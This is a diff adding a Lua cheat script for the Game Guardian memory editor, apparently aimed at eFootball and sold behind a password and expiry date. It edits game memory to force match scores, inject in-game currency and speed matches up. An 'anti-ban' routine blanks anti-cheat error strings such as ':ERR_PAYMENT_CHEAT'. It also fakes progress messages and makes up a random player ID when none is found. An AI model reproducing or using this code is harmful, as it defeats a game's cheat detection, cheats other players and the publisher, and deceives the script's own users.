+local bar = string.rep("🌸", fill) .. string.rep("🤍", 10 - fill)
+gg.toast("◢ 🎀 PINK_SCANNER ◤\n" .. bar .. " [" .. progress .. "%]\n" .. sym .. " " .. load_msg)
+gg.sleep(80)
+end
+pcall(function()
+gg.setRanges(gg.REGION_ANONYMOUS | gg.REGION_C_ALLOC)
+gg.clearResults()
+gg.searchNumber("2Dh;00h;?h;?h;2Dh;00h;?h;?h;2Dh", gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1)
+if gg.getResultCount() > 0 then
+local res = gg.getResults(3)
+for _, v in ipairs(res) do
+local potential = ""
+local bytes = gg.getValues({{address=v.address-8, flags=gg.TYPE_BYTE}, {address=v.address-6, flags=gg.TYPE_BYTE}, {address=v.address-4, flags=gg.TYPE_BYTE}, {address=v.address-2, flags=gg.TYPE_BYTE}, {address=v.address, flags=gg.TYPE_BYTE}, {address=v.address+2, flags=gg.TYPE_BYTE}, {address=v.address+4, flags=gg.TYPE_BYTE}, {address=v.address+6, flags=gg.TYPE_BYTE}, {address=v.address+8, flags=gg.TYPE_BYTE}, {address=v.address+10, flags=gg.TYPE_BYTE}, {address=v.address+12, flags=gg.TYPE_BYTE}, {address=v.address+14, flags=gg.TYPE_BYTE}, {address=v.address+16, flags=gg.TYPE_BYTE}})
+for _, b in ipairs(bytes) do
+if b.value >= 32 and b.value <= 126 then potential = potential .. string.char(b.value) end
+end
+if potential:match("%w%w%w%w%-%d%d%d%-%d%d%d") then
+found_id = potential
+break
+end
+end
+end
+end)
+if not found_id then
+local letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+local prefix = ""
+for i = 1, 4 do
+local idx = math.random(1, #letters)
+prefix = prefix .. letters:sub(idx, idx)
+end
+found_id = string.format("%s-%03d-%03d-%03d", prefix, math.random(100, 999), math.random(100, 999), math.random(100, 999))
+end
+saved_ef_id = found_id
+gg.toast("✅ NEURAL LINK ESTABLISHED ✨🌸")
+return saved_ef_id
+end
+
+-- [[ 🛡️ SECURITY & VALIDATION ]] -------------------------------
+
+function CheckExpiry()
+if PERPETUAL_MODE then return end
+local curr_val = tonumber(os.date("%Y%m%d"))
+local clean_exp = expire_date:gsub("%D", "")
+local exp_val = tonumber(clean_exp)
+if exp_val == nil then
+gg.alert("❌ [SYSTEM ERROR] ❌\nInvalid expiry date format.")
+os.exit()
+end
+if curr_val > exp_val then
+gg.alert("❌ [LICENSE EXPIRED] ❌\n".."────────────────────────\n".."NEURAL LINK TERMINATED: Script has reached its limit.\n".."EXPIRED ON: " .. expire_date .. "\n".."────────────────────────\n".."Please contact HANZ NPC for a new Data Chip.")
+os.exit()
+end
+end
+
+local REQUIRED_GG = "101.1"
+if gg.VERSION < REQUIRED_GG then
+gg.alert("❌ [VERSION ERROR] ❌\n".."────────────────────────\n".."NEURAL LINK FAILED: Your Game Guardian is outdated.\n".."REQUIRED: v" .. REQUIRED_GG .. " or higher.\n".."────────────────────────\n".."Please update your Cyberdeck (GG) to continue.")
+os.exit()
+end
+
+CheckExpiry()
+
+function ShowLockedMessage()
+PlayPinkSound("error")
+local alert = gg.alert("🧁 [" .. (L.locked_title or "DENIED") .. "] 🧁\n"..DIVIDER.."\n" .. (L.locked_msg or "") .. "\n\nContact HANZ DARKSIDE.", L.p_order, L.p_tele, L.back)
+if alert == 1 then OpenURL(WA_LINK) elseif alert == 2 then OpenURL(SOSMED_LINK) end
+end
+
+function AntiBanSystem()
+CyberAnim(L.sec_securing or "SECURING SYSTEM")
+gg.clearResults()
+pcall(function()
+gg.setRanges(gg.REGION_ANONYMOUS | gg.REGION_C_ALLOC | gg.REGION_C_BSS | gg.REGION_C_DATA)
+gg.skipAddressCount = "0"
+end)
+gg.toast("🛡️ " .. (L.sec_active or "STEALTH ACTIVE") .. " ✨🎀💖")
+end
+
+function SecurityWipe()
+gg.clearResults()
+gg.toast("🧹 " .. (L.mem_wipe or "LOGS PURGED") .. " 🌸✨💖")
+end
+
+-- [[ ⚡ HACK EXECUTION FUNCTIONS ]] ----------------------------
+
+function ExecuteGoalHack()
+pcall(function()
+gg.clearResults()
+gg.setRanges(gg.REGION_ANONYMOUS | gg.REGION_C_ALLOC)
+local search_val = (math.random(1,2) == 1) and "0~2;0;0;0;1:25" or "0~1;0;0;0;1:20"
+gg.searchNumber(search_val, gg.TYPE_DWORD)
+gg.refineNumber("0~2", gg.TYPE_DWORD)
+local count = gg.getResultCount()
+if count > 0 then
+local res = gg.getResults(100)
+local edit = {}
+for i, v in ipairs(res) do
+edit[i] = {address = v.address, value = 3, flags = v.flags, freeze = true}
+end
+gg.addListItems(edit)
+gg.setValues(edit)
+gg.toast("✅ " .. (L.goal_ok or "INJECTED") .. " 🎀✨💖")
+else
+gg.toast("⚠️ " .. (L.goal_fail or "NOT FOUND") .. " 🍭")
+end
+end)
+end
+
+function AutoWinProtocol()
+if PREMIUM_LOCKED then ShowLockedMessage() Main() return end
+local menu = gg.choice({"🏆 ❯ " .. (L.auto_win or "ACTIVATE AUTO-WIN"), "⏱️ ❯ " .. (L.end_match or "END MATCH"), "🔙 ❯ " .. (L.back or "BACK")}, nil, "🔱 『 🎀 AUTO-WIN 🎀 』 🔱")
+if menu == 1 then
+PlayPinkSound("activate")
+auto_win_active = true
+ProcessEffect("Overriding Neural Score")
+ExecuteGoalHack()
+local confirm = gg.alert("🎀 [SCORE OVERRIDE DETECTED] 🎀\n"..DIVIDER.."\n" .. (L.score_target or "Target: 3") .. "\n"..DIVIDER, L.continue or "CONTINUE", L.sys_cancel or "CANCEL")
+if confirm == 1 then
+PreSpeedEffect()
+gg.setSpeed(3600)
+gg.toast("🚀 " .. (L.accel_win or "ACCELERATING...") .. " ✨")
+gg.sleep(10000)
+gg.setSpeed(1)
+gg.toast("⏳ " .. (L.system_stab or "STABILIZED") .. " 🌸")
+else
+auto_win_active = false
+gg.toast("⚠️ " .. (L.proto_abort or "ABORTED"))
+end
+Main()
+elseif menu == 2 then
+PlayPinkSound("activate")
+CyberAnim(L.loading or "Bypassing")
+PreSpeedEffect()
+gg.setSpeed(3600)
+gg.sleep(5000)
+gg.setSpeed(1)
+gg.toast("🏁 " .. (L.proto_fin or "FINISHED") .. " ✨🎀")
+AutoWinProtocol()
+elseif menu == 3 then Main() end
+end
+
+function CurrencyProtocol()
+if PREMIUM_LOCKED then ShowLockedMessage() Main() return end
+local menu = gg.choice({
+"💰 ❯ " .. (L.inject_gp or "GP"),
+"💎 ❯ " .. (L.inject_coin or "E-COIN"),
+"🔙 ❯ " .. (L.back or "BACK")
+}, nil, "💳 『 " .. (L.currency_title or "CURRENCY") .. " 』 💳")
+
+if menu == 1 then
+    local amt = gg.prompt({L.amt_prompt or "ENTER AMOUNT:"}, {"999999999"}, {"number"})
+    if not amt then return end
+    PlayPinkSound("activate")
+    ProcessEffect("Injecting GP")
+    gg.clearResults()
+    gg.setRanges(gg.REGION_ANONYMOUS | gg.REGION_C_ALLOC)
+    gg.searchNumber("1000~50000;0;0;0:20", gg.TYPE_DWORD)
+    local count = gg.getResultCount()
+    if count > 0 then
+        local res = gg.getResults(20)
+        for i, v in ipairs(res) do res[i].value = amt[1] end
+        gg.setValues(res)
+        gg.toast("✅ " .. (L.gp_ok or "DONE") .. " 💰✨")
+    else
+        gg.toast("❌ " .. (L.failed or "FAILED"))
+    end
+elseif menu == 2 then
+    local amt = gg.prompt({L.amt_prompt or "ENTER AMOUNT:"}, {"999999"}, {"number"})
+    if not amt then return end
+    PlayPinkSound("activate")
+    ProcessEffect("Injecting E-Coin")
+    gg.clearResults()
+    gg.setRanges(gg.REGION_ANONYMOUS | gg.REGION_C_ALLOC)
+    gg.searchNumber("10~5000;0;0:15", gg.TYPE_DWORD)
+    local count = gg.getResultCount()
+    if count > 0 then
+        local res = gg.getResults(10)
+        for i, v in ipairs(res) do res[i].value = amt[1] end
+        gg.setValues(res)
+        gg.toast("✅ " .. (L.coin_ok or "DONE") .. " 💎✨")
+    else
+        gg.toast("❌ " .. (L.failed or "FAILED"))
+    end
+end
+Main()
+
+end
+
+function CancelMatchProtocol()
+local back_text = L.back or "BACK"
+local menu_title = "🛰️ 『 " .. (L.selector_title or "CANCEL SELECTOR") .. " 』 🛰️\n"..DIVIDER
+
+local t = gg.choice({
+    "🔥 ❯ " .. (L.delay_inst or "INSTANT"), "⚡ ❯ " .. (L.delay_10 or "10 SECS"),
+    "⏳ ❯ " .. (L.delay_30 or "30 SECS"), "🛡️ ❯ " .. (L.delay_60 or "10 SECS"),
+    "🔙 ❯ " .. back_text
+}, nil, menu_title)
+
+if t == nil or t == 5 then CancelMatchChoiceMenu() return end
+
+PlayPinkSound("activate")
+local wait_time = (t == 1 and 0) or (t == 2 and 10) or (t == 3 and 30) or (t == 4 and 10)
+
+if wait_time > 0 then
+    local symbols = {"🌸", "💖", "✨", "🎀", "🍭"}
+    local idle_msg = L.idle_msg or "WAITING"
+    for i = 0, wait_time do
+        local sym = symbols[(i % #symbols) + 1]
+        local remaining = wait_time - i
+        local progress = math.floor((i / wait_time) * 100)
+        local fill = math.floor(progress / 10)
+        local bar = string.rep("🌸", fill) .. string.rep("💖", 10 - fill)
+        gg.toast("🎀✨ [" .. idle_msg .. "] " .. sym .. "\n" .. bar .. " [" .. progress .. "%]\n✨ " .. (L.remaining or "REMAINING") .. ": " .. remaining .. "s")
+        gg.sleep(1000)
+    end
+end
+
+CyberAnim(L.cancel_match or "CANCELING GAME")
+PreSpeedEffect()
+gg.setSpeed(3600)
+gg.sleep(7000)
+gg.setSpeed(1)
+
+local exit_ask = gg.alert("🏁 [" .. (L.severed or "SEVERED") .. "]\n" .. DIVIDER .. "\n" .. (L.force_kill or "FORCE KILL?"), L.sys_ok or "YES", L.sys_cancel or "NO")
+if exit_ask == 1 then
+    local shutdown_text = L.shutdown or "SHUTDOWN"
+    for i = 5, 1, -1 do
+        gg.toast("🔌 [" .. shutdown_text .. "] 🍭 " .. (L.disc_in or "DISC IN") .. ": " .. i .. "s")
+        gg.sleep(1000)
+    end
+    gg.processKill() ExitScript()
+else CancelMatchChoiceMenu() end
+
+end
+
+-- [[ 🪄 VISUAL ENGINE EFFECTS ]] ------------------------------
+
+function RandomChipEffect()
+local hex = {"0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"}
+for i = 1, 15 do
+local line = ""
+for j = 1, 20 do line = line .. hex[math.random(1,#hex)] .. " " end
+gg.toast("📟 [DECRYPTING_CHIP] 🌸\n" .. line)
+gg.sleep(50)
+end
+end
+
+function ScrollingTextEffect()
+local text = "  >>> ESTABLISHING NEURAL LINK... [OK] >>> BYPASSING FIREWALL... [OK] >>> LOADING PINK SYNDICATE ASSETS... [OK] >>>  "
+for i = 1, 30 do
+local scroll = text:sub(i) .. text:sub(1, i)
+gg.toast("✨ " .. scroll:sub(1, 40) .. " ✨")
+gg.sleep(40)
+end
+end
+
+function CyberAnim(text)
+local frames = {"◐", "◓", "◑", "◒"}
+for i = 1, 8 do
+gg.toast(frames[(i%4)+1] .. " " .. text:upper() .. " " .. frames[(i%4)+1])
+gg.sleep(150)
+end
+end
+
+function ProcessEffect(task)
+for i = 1, 5 do
+gg.toast("🎀 " .. task .. " (" .. i*20 .. "%) 🧁")
+gg.sleep(200)
+end
+end
+
+function Loading()
+local dots = {"", ".", "..", "..."}
+for i = 1, 8 do
+gg.toast("🌸 " .. (L.loading or "LOADING") .. dots[(i%4)+1] .. " 💖")
+gg.sleep(250)
+end
+end
+
+function PreSpeedEffect()
+CyberAnim(L.warp_init or "PREPARING WARP")
+gg.toast("🚀 " .. (L.warp_eng or "WARP DRIVE ENGAGED!") .. " ✨🎀")
+end
+
+-- [[ 🖥️ NAVIGATION & MENUS ]] ---------------------------------
+
+function LoginSystem()
+local lang_choice = nil
+while lang_choice == nil do
+lang_choice = gg.choice({
+"🇮🇩 Indonesia", "🇺🇸 English", "🇨🇳 Chinese", "🇲🇾 Malay",
+"🇯🇵 Japanese", "🇹🇭 Thailand", "🇻🇳 Vietnamese", "🇵🇭 Philippines", "🇸🇦 العربية"
+}, nil, "🎀✨ [ CHOOSE YOUR LANGUAGE ] ✨🎀\n" .. DIVIDER)
+
+if lang_choice == nil then
+        PlayPinkSound("error")
+        gg.alert(
+            "⚠️ [ PLEASE CHOOSE A LANGUAGE ]\n" ..
+            "------------------------------------\n" ..
+            "🇮🇩 Mohon pilih bahasa Anda!\n" ..
+            "🇺🇸 Please select your language!\n" ..
+            "🇨🇳 请选择您的语言！\n" ..
+            "🇲🇾 Sila pilih bahasa anda!\n" ..
+            "🇯🇵 言語を選択してください！\n" ..
+            "🇹🇭 กรุณาเลือกภาษาของคุณ!\n" ..
+            "🇻🇳 Vui lòng chọn ngôn ngữ của bạn!\n" ..
+            "🇵🇭 Mangyaring ipasok ang iyong wika!\n" ..
+            "🇸🇦 الرجاء اختيار اللغة الخاصة بك!",
+            "OK"
+        )
+    end
+end
+
+SetLanguage(lang_choice)
+PlayPinkSound("click")
+
+local neural_ui =
+    "╔══════════ ♡ 🎀 ♡ ══════════╗\n"..
+    "║  📡 [" .. (L.welcome:upper() or "WELCOME") .. "]\n"..
+    "╠══════════════════════════════╣\n"..
+    "║   🎀  ＨＡＮＺ  ＰＲＯＪＥＣＴ  🎀\n"..
+    "╠══════════════════════════════╣\n"..
+    "║    P I N K  E D I T I O N\n"..
+    "╚══════════ ♡ 🎀 ♡ ══════════╝\n"..
+    (L.ready or "READY")
+
+gg.alert(neural_ui, L.sys_ok)
+
+RandomChipEffect()
+ScrollingTextEffect()
+
+local hacker_prompt =
+    BORDER .. "\n"..
+    (L.logo_premium or "⚡ HANZ PROJECT ⚡").."\n"..
+    BORDER_B .. "\n"..
+    "📡 STATUS : " .. (L.status or "READY") .. "\n"..
+    "🛡️ IDENTITY: " .. random_id .. "\n"..
+    "🎀 PROTOCOL: NEURAL_OVERRIDE_V10.0\n"..
+    DIVIDER .. "\n"..
+    "🖥️ TERMINAL: @HANZ_DARKSIDE\n"..
+    "🔑 " .. (L.pass_prompt or "ENTER PASSWORD") .. "\n"..
+    DIVIDER
+
+local pw = nil
+while true do
+    pw = gg.prompt({hacker_prompt, " 🌸 " .. (L.forgot_pass or "FORGOT PASSWORD")}, {"", false}, {"text", "checkbox"})
+
+    if pw == nil then
+        ExitScript()
+    end
+
+    if pw[2] == true then
+        FastLinkMenu()
+        return
+    end
+
+    if pw[1] == "" then
+        PlayPinkSound("error")
+        gg.alert(
+            "⚠️ [ SECURITY PROTOCOL ]\n" ..
+            "------------------------------------\n" ..
+            "🇮🇩 Harap masukkan password Anda!\n" ..
+            "🇺🇸 Please enter your password!\n" ..
+            "🇨🇳 请输入您的密码！\n" ..
+            "🇲🇾 Sila masukkan kata laluan anda!\n" ..
+            "🇯🇵 パスワードを入力してください！\n" ..
+            "🇹🇭 กรุณากรอกรหัสผ่านของคุณ!\n" ..
+            "🇻🇳 Vui lòng nhập mật khẩu của bạn!\n" ..
+            "🇵🇭 Mangyaring ipasok ang iyong password!\n" ..
+            "🇸🇦 يرجى إدخال كلمة المرور الخاصة بك!",
+            L.sys_ok
+        )
+    else
+        break
+    end
+end
+
+if pw[1] == REAL_PASSWORD then
+    PlayPinkSound("connect")
+    gg.toast("✅ " .. (L.access_ok or "ACCESS GRANTED") .. " ✨🌸💖")
+
+    math.randomseed(os.time())
+    local q = hanz_quotes[math.random(1, #hanz_quotes)]
+
+    local primary_q_text = ""
+    local secondary_q_text = ""
+    local secondary_lang_label = "ENGLISH"
+
+    if selected_lang_id == 1 then primary_q_text = q.id secondary_q_text = q.en secondary_lang_label = "ENGLISH"
+    elseif selected_lang_id == 2 then primary_q_text = q.en secondary_q_text = q.id secondary_lang_label = "INDONESIA"
+    elseif selected_lang_id == 3 then primary_q_text = q.cn secondary_q_text = q.en secondary_lang_label = "ENGLISH"
+    elseif selected_lang_id == 4 then primary_q_text = q.my secondary_q_text = q.en secondary_lang_label = "ENGLISH"
+    elseif selected_lang_id == 5 then primary_q_text = q.jp secondary_q_text = q.en secondary_lang_label = "ENGLISH"
+    elseif selected_lang_id == 6 then primary_q_text = q.th secondary_q_text = q.en secondary_lang_label = "ENGLISH"
+    elseif selected_lang_id == 7 then primary_q_text = q.vn secondary_q_text = q.en secondary_lang_label = "ENGLISH"
+    elseif selected_lang_id == 8 then primary_q_text = q.ph secondary_q_text = q.en secondary_lang_label = "ENGLISH"
+    elseif selected_lang_id == 9 then primary_q_text = q.ar secondary_q_text = q.en secondary_lang_label = "ENGLISH"
+    end
+
+    local function formatSentence(str)
+        local s = str:lower()
+        return s:gsub("^%l", string.upper)
+    end
+
+    local q_pri_fmt = formatSentence(primary_q_text)
+    local q_sec_fmt = formatSentence(secondary_q_text)
+    local status_time = PERPETUAL_MODE and "UNLIMITED" or expire_date
+
+    local broadcast_ui = ""
+    if selected_lang_id == 9 then
+        broadcast_ui =
+            "╚════════════ 『 ⚡ 』 ════════════╝\n"..
+            "⏳ " .. L.init .. "\n"..
+            "╠══════════════════════════════════╣\n"..
+            "\"" .. q_sec_fmt .. "\"\n"..
+            " :[" .. secondary_lang_label .. "] 💬\n"..
+            "──────────────────────────────────\n"..
+            "\"" .. q_pri_fmt .. "\"\n"..
+            q.artist .. "      [🎧 " .. L.lang_label .. "] 💬\n"..
+            "╠══════════════════════════════════╣\n"..
+            status_time .. " :LIFETIME 📟\n"..
+            "HANZ DARKSIDE :OPERATOR 👤\n"..
+            "╠══════════════════════════════════╣\n"..
+            "      ✨  ＨＡＮＺ  ＢＲＯＡＤＣＡＳＴ  ✨      \n"..
+            "╔════════════ 『 ✉️ 』 ════════════╗"
+    else
+        broadcast_ui =
+            "╔════════════ 『 ✉️ 』 ════════════╗\n"..
+            "║       ✨  ＨＡＮＺ  ＢＲＯＡＤＣＡＳＴ  ✨      \n"..
+            "╠══════════════════════════════════╣\n"..
+            "👤 OPERATOR: HANZ DARKSIDE\n"..
+            "📟 LIFETIME: "..status_time.."\n"..
+            "╠══════════════════════════════════╣\n"..
+            "💬 [" .. L.lang_label .. " 🎧]      "..q.artist.."\n"..
+            "\"" .. q_pri_fmt .. "\"\n"..
+            "──────────────────────────────────\n"..
+            "💬 [" .. secondary_lang_label .. "]:\n"..
+            "\"" .. q_sec_fmt .. "\"\n"..
+            "╠══════════════════════════════════╣\n"..
+            "⏳ " .. L.init .. "\n"..
+            "╚════════════ 『 ⚡ 』 ════════════╝"
+    end
+
+    local timer_limit = 10
+    local start_timer = os.clock()
+    gg.setVisible(false)
+    while (os.clock() - start_timer) < timer_limit do
+        local remaining = math.ceil(timer_limit - (os.clock() - start_timer))
+        gg.toast("⏳ " .. L.init .. " : " .. remaining .. "s")
+        local res = gg.alert(broadcast_ui, L.start_now, L.sys_cancel)
+        if res == 1 then break end
+        gg.sleep(1000)
+        if remaining <= 1 then break end
+    end
+    AntiBanSystem()
+    Loading()
+else
+    PlayPinkSound("error")
+    local fail_ui =
+        "🚨 [" .. L.access_fail .. "] 🚨\n"..
+        DIVIDER.."\n"..
+        "ATTENTION! Neural connection failed.\n"..
+        "ID: " .. random_id .. "\n"..
+        "────────────────────────\n"..
+        L.contact .. "\n"..
+        "────────────────────────\n"..
+        "👤 OPERATOR: HANZ DARKSIDE\n"..
+        DIVIDER
+
+    local ask = gg.alert(fail_ui, "📱 WHATSAPP", "💬 TELEGRAM", "🔄 " .. L.back)
+    if ask == 1 then OpenURL(WA_LINK) LoginSystem()
+    elseif ask == 2 then OpenURL(SOSMED_LINK) LoginSystem()
+    else LoginSystem() end
+end
+
+end
+
+function Main()
+    collectgarbage("collect")
+    local status, err = pcall(function()
+        SecurityWipe()
+        local active_id = GetRealEfootballID()
+        local HEADER_FINAL = "╭━━━ ♡ 🎀 ꒰ ID: "..active_id.." ꒱ 🎀 ♡ ━━━╮"
+        local coin_label = PREMIUM_LOCKED and "🔒" or "FREE"
+        local pj_label   = PREMIUM_LOCKED and "🔒" or (ping_jump_active and (L.term_ok or "ON") or (L.term_no or "OFF"))
+        local aw_label   = PREMIUM_LOCKED and "🔒" or (auto_win_active and (L.term_ok or "ON") or (L.term_no or "OFF"))
+
+        -- ==========================================================
+        -- MEMU UTAMA: Batal Pertandingan dipindahkan ke paling atas
+        -- ==========================================================
+        local menu = gg.choice({
+            "💥 ❯ " .. L.cancel_m, -- URUTAN #1
+            "🌸 ❯ " .. L.ping_jump .. " [" .. pj_label .. "]",
+            "🏆 ❯ " .. L.auto_win .. " [" .. aw_label .. "]",
+            "💳 ❯ " .. L.currency .. " [" .. coin_label .. "]",
+            "💀 ❯ " .. L.f_kill,
+            "💎 ❯ " .. (L.hack_other or "HACK LAINNYA"),
+            "🎀 ❯ " .. L.page2,
+            "🚪 ❯ " .. L.jack_out
+        }, nil, HEADER_FINAL .. "\n" .. L.logo_premium .. "\n" .. L.op_label .. " | ID: " .. random_id .. "\n" .. LINE .. "\n          『 🌸 " .. L.page1 .. " 🌸 』\n" .. BORDER_B)
+
+        if menu == nil then return end
+        PlayPinkSound("click")
+
+        if menu == 1 then -- LOGIKA UNTUK URUTAN #1 (Batal Pertandingan)
+            CancelMatchChoiceMenu()
+        elseif menu == 2 then -- LOGIKA UNTUK URUTAN #2 (Ping Jump)
+            if PREMIUM_LOCKED then ShowLockedMessage() Main() else
+                if not ping_jump_active then
+                    local side = gg.choice({"🏠 ❯ " .. L.home_side, "🚩 ❯ " .. L.away_side, "🔙 ❯ " .. L.back}, nil, "🚀 『 🎀 " .. L.config_title .. " 🎀 』")
+                    if side == 1 then pj_side = "HOME" ping_jump_active = true elseif side == 2 then pj_side = "AWAY" ping_jump_active = true end
+                else ping_jump_active = false pj_side = "NONE" gg.setSpeed(1) end
+            end
+        elseif menu == 3 then -- LOGIKA UNTUK URUTAN #3 (Auto Win)
+            AutoWinProtocol()
+        elseif menu == 4 then -- LOGIKA UNTUK URUTAN #4 (Currency)
+            CurrencyProtocol()
+        elseif menu == 5 then -- LOGIKA UNTUK URUTAN #5 (Force Kill)
+            local confirm = gg.alert(L.force_kill, L.term_ok, L.term_no)
+            if confirm == 1 then gg.processKill() ExitScript() else Main() end
+        elseif menu == 6 then -- LOGIKA UNTUK URUTAN #6 (Hack Lainnya)
+            MenuThree()
+        elseif menu == 7 then -- LOGIKA UNTUK URUTAN #7 (Page 2)
+            MenuTwo()
+        elseif menu == 8 then -- LOGIKA UNTUK URUTAN #8 (Jack Out)
+            ExitScript()
+        end
+    end)
+    if not status then if is_running then Main() end end
+end
+
+-- [[ 🧮 CALCULATOR ENGINE - SMART NEURAL MODE ]] ----------------
+
+function NeuralCalculator()
+PlayPinkSound("click")
+
+local calc_header =
+    BORDER .. "\n" ..
+    "   📟 " .. (L.calc_name or "CALCULATOR") .. "   \n" ..
+    BORDER_B .. "\n" ..
+    "✨ " .. (L.calc_desc or "Select desired mathematical operation.") .. "\n" ..
+    DIVIDER
+
+local op_choice = gg.choice({
+    "➕ ❯ " .. (L.lang_label == "INDONESIA" and "PENJUMLAHAN" or "ADDITION"),
+    "➖ ❯ " .. (L.lang_label == "INDONESIA" and "PENGURANGAN" or "SUBTRACTION"),
+    "✖️ ❯ " .. (L.lang_label == "INDONESIA" and "PERKALIAN" or "MULTIPLICATION"),
+    "➗ ❯ " .. (L.lang_label == "INDONESIA" and "PEMBAGIAN" or "DIVISION"),
+    "🔙 ❯ " .. L.back
+}, nil, calc_header)
+
+if op_choice == nil or op_choice == 5 then return end
+PlayPinkSound("click")
+
+local prompt_title = ""
+local sym = ""
+if op_choice == 1 then prompt_title = "MODE: [ ➕ ]" sym = "+"
+elseif op_choice == 2 then prompt_title = "MODE: [ ➖ ]" sym = "-"
+elseif op_choice == 3 then prompt_title = "MODE: [ ✖️ ]" sym = "×"
+elseif op_choice == 4 then prompt_title = "MODE: [ ➗ ]" sym = "÷"
+end
+
+local input = gg.prompt({
+    prompt_title .. "\n" .. DIVIDER .. "\n1️⃣ " .. (L.calc_val1 or "FIRST NUMBER"),
+    "2️⃣ " .. (L.calc_val2 or "SECOND NUMBER")
+}, {"0", "0"}, {"text", "text"})
+
+if not input then return end
+
+local v1 = tonumber(input[1]) or 0
+local v2 = tonumber(input[2]) or 0
+local res = 0
+
+if op_choice == 1 then
+    res = v1 + v2
+elseif op_choice == 2 then
+    res = v1 - v2
+elseif op_choice == 3 then
+    res = v1 * v2
+elseif op_choice == 4 then
+    if v2 == 0 then
+        res = "ERR: DIV/0"
+    else
+        res = v1 / v2
+    end
+end
+
+PlayPinkSound("activate")
+
+local res_display = (type(res) == "number") and tostring(res):gsub("%.0$", "") or res
+
+local result_ui =
+    BORDER .. "\n" ..
+    "   📟 " .. (L.calc_res or "RESULT") .. "\n" ..
+    BORDER_B .. "\n" ..
+    DIVIDER .. "\n" ..
+    " 📥 INPUT A : " .. v1 .. "\n" ..
+    " ⚙️ PROTOCOL: [" .. sym .. "]\n" ..
+    " 📥 INPUT B : " .. v2 .. "\n" ..
+    "────────────────────────\n" ..
+    " 🌸 RESULT  : " .. res_display .. " ✨\n" ..
+    DIVIDER
+
+gg.alert(result_ui, L.sys_ok)
+
+end
+
+function MenuTwo()
+local menu = gg.choice({
+"🛡️ ❯ " .. L.ice_breaker,
+"📡 ❯ " .. L.network,
+"🔮 ❯ " .. L.scanner,
+"⚙️ ❯ " .. L.tuner,
+"🧮 ❯ " .. L.calc_name,
+"🔙 ❯ " .. L.back
+}, nil, BORDER.."\n"..L.logo_premium.."\n"..LINE.."\n   [ 🎀 " .. L.page2 .. " 🎀 ]\n"..BORDER_B)
+
+if menu == nil or menu == 6 then
+    PlayPinkSound("click")
+    Main()
+else
+    PlayPinkSound("click")
+    if menu == 1 then
+        AntiBanSystem()
+        MenuTwo()
+    elseif menu == 2 then
+        SosmedMenu(false)
+    elseif menu == 3 then
+        local sc = gg.choice({ "🔍 " .. L.new_scan, "🧹 " .. L.wipe_scan, "🔙 " .. L.back }, nil, "🔮 " .. L.scanner)
+        if sc == 3 or sc == nil then MenuTwo() else Main() end
+    elseif menu == 4 then
+        local ut = gg.choice({ "⚡ " .. L.overclock, "🎮 " .. L.fps_120, "🧹 " .. L.ram_clean, "🔙 " .. L.back }, nil, "⚙️ " .. L.hw_opt)
+        if ut == 4 or ut == nil then MenuTwo() else Main() end
+    elseif menu == 5 then
+        NeuralCalculator()
+        MenuTwo()
+    end
+end
+
+end
+
+function MenuThree()
+local page3_label = L.page3 or "MENU HACK LAINNYA - HALAMAN 3"
+
+-- Memberikan label kunci jika premium terkunci
+local lock_p = PREMIUM_LOCKED and " [🔒]" or ""
+
+local menu = gg.choice({
+    "🛡️ ❯ " .. L.h_antiban .. lock_p,
+    "🏆 ❯ " .. L.h_autowin .. lock_p,
+    "🌐 ❯ " .. L.h_online .. lock_p,
+    "🕹️ ❯ " .. L.h_offline .. lock_p,
+    "🔙 ❯ " .. L.back
+}, nil, BORDER.."\n"..L.logo_premium.."\n"..LINE.."\n   [ 🎀 " .. page3_label .. " 🎀 ]\n"..BORDER_B)
+
+if menu == nil or menu == 5 then
+    PlayPinkSound("click")
+    Main()
+else
+    -- [ PENGECEKAN PREMIUM UNTUK SEMUA HACK DI HALAMAN INI ]
+    if PREMIUM_LOCKED then
+        ShowLockedMessage()
+        Main()
+        return
+    end
+
+    PlayPinkSound("click")
+    if menu == 1 then ch1_antiban() MenuThree()
+    elseif menu == 2 then ch2_autowin() MenuThree()
+    elseif menu == 3 then ch3_online() MenuThree()
+    elseif menu == 4 then ch4_offline() MenuThree()
+    end
+end
+
+end
+
+-- [[ 🛠️ HANZ V10 ENGINE FUNCTIONS ]] ---------------------------
+
+function ch1_antiban()
+PlayPinkSound("activate")
+CyberAnim(L.h_antiban)
+gg.setVisible(false)
+local err_list = {":ERR_NONSUPPORT", ":ERR_PAYMENT_CHEAT", ":ERR_INVALID_TICKET", ":ERR_TOO_MANY_GUEST", ":ERR_INSUFFICIENT_MY_AGENT", ":ReservationDenied Banned", ":_ZN6icu_6424DateTimePatternGenerator9hackTimesERKNS_13UnicodeStringER10UErrorCode"}
+
+for _, err in ipairs(err_list) do
+    gg.setRanges(gg.REGION_C_DATA)
+    gg.searchNumber(err, gg.TYPE_BYTE)
+    if gg.getResultCount() > 0 then
+        gg.editAll("0", gg.TYPE_BYTE)
+        gg.clearResults()
+    end
+end
+
+local hex_list = {
+    "h10 00 20 00 00 00 45 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
+    "h00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 7c e3 14 08 00 00 00 00 18 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
+    "h8a e5 14 08 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 00 00 10 00 00 00 00 00 45 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 3a e0 14 08 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 00 00 10 00",
+    "hff c3 00 d1 f4 7b 02 a9 fd 83 00 91 00 cc 41 f9 a9 0b 40 f9 be 1b 40 bd e7 03 1f aa 08 00 40 f9 08 11 45 f9 e6 43 00 39 e6 03 1f aa fe 0b 00 bd e9 03 00 f9 00 01 3f d6 fd 7b 42 a9 00 00 00 12 ff c3 00 91 c0 03 5f d6",
